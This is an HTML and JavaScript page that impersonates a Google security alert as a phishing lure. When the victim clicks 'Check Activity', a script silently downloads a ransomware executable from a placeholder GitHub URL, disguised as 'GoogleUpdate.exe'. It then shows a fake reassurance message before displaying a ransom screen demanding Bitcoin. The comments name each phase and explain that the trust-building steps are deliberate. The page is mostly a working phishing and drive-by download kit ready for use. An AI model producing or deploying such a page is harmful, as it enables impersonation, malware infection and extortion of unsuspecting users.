<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Google Security Alert</title>
    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background-color: #f2f2f2;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .card {
            background: white;
            padding: 40px;
            border-radius: 8px;
            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
            text-align: center;
            max-width: 400px;
            width: 100%;
        }
        .google-logo {
            width: 75px;
            margin-bottom: 20px;
        }
        h2 { color: #202124; margin-bottom: 10px; }
        p { color: #5f6368; font-size: 14px; line-height: 1.5; margin-bottom: 20px; }
        .btn {
            background-color: #1a73e8;
            color: white;
            border: none;
            padding: 10px 20px;
            border-radius: 4px;
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
            text-decoration: none;
            display: inline-block;
        }
        .btn:hover { background-color: #1765cc; }
        .hidden { display: none; }
        
        /* The Ransomware Overlay */
        #ransomware-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: black;
            color: red;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            z-index: 9999;
            display: none; /* Hidden initially */
        }
        #ransomware-overlay h1 { font-size: 3rem; text-transform: uppercase; }
        #ransomware-overlay p { font-size: 1.2rem; max-width: 80%; }
    </style>
</head>
<body>

    <!-- PHASE 1: The Fake Google Security Page -->
    <div id="phishing-page" class="card">
        <img src="https://ssl.gstatic.com/accounts/ui/icon/20150112_account_27.png" class="google-logo" alt="Google">
        <h2>Security Alert</h2>
        <p><strong>Someone may have logged into your account.</strong><br>
        If this was you, you can ignore this. If not, check your activity.</p>
        <button class="btn" onclick="startAttack()">Check Activity</button>
    </div>

    <!-- PHASE 3: The Ransomware Screen -->
    <div id="ransomware-overlay">
        <h1>YOU HAVE BEEN PWNED</h1>
        <p>All your files have been encrypted.</p>
        <p>Send 0.05 BTC to: <strong>1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa</strong></p>
        <p>To decrypt, click "Send Payment" then refresh your device.</p>
    </div>

    <script>
        function startAttack() {
            // 1. Hide the phishing page
            document.getElementById('phishing-page').style.display = 'none';

            // 2. Trigger the Drive-By Download (Ransomware)
            // We create a hidden link to your actual malware .exe hosted in this repo
            const malwareUrl = 'https://raw.githubusercontent.com/YOUR_USERNAME/YOUR_REPO/main/ransomware.exe';
            
            const link = document.createElement('a');
            link.href = malwareUrl;
            link.download = 'GoogleUpdate.exe'; // Looks innocent
            document.body.appendChild(link);
            link.click();
            document.body.removeChild(link);

            // 3. Simulate "Checking Activity" for 3 seconds to build trust
            setTimeout(() => {
                // 4. Show the "It was you" success message briefly
                const successMsg = document.createElement('div');
                successMsg.className = 'card';
                successMsg.innerHTML = '<h2>Activity Verified</h2><p>This was you. Your account is secure.</p><button class="btn" onclick="finalTrigger()">Done</button>';
                document.body.appendChild(successMsg);
            }, 2000);
        }

        function finalTrigger() {
            // 5. Deploy the Ransomware Overlay
            document.getElementById('ransomware-overlay').style.display = 'flex';
            
            // Optional: Play a scary sound or lock the scroll
            document.body.style.overflow = 'hidden';
        }
    </script>
</body>
</html>
